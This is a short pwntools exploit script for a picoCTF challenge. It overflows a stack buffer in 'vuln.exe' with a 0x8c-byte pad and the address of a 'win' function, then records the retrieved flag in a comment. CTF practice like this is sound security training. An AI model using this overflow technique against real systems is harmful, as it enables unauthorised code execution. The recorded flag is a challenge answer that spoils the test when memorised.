#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template vuln.exe
from pwn import *

HOST, PORT = "saturn.picoctf.net 61448".split()
# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = 'vuln.exe'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process(["wine", exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

win = 0x401530

io = start()
offset = 0x8c
payload = b""
payload += cyclic_gen().get(offset)
payload += p32(win)
io.sendlineafter(b"\r\n", payload)
flag = io.recvline().strip().decode()
log.success(f"Got flag: {flag}")

# [+] Got flag: picoCTF{Un_v3rr3_d3_v1n_266a4ad8}
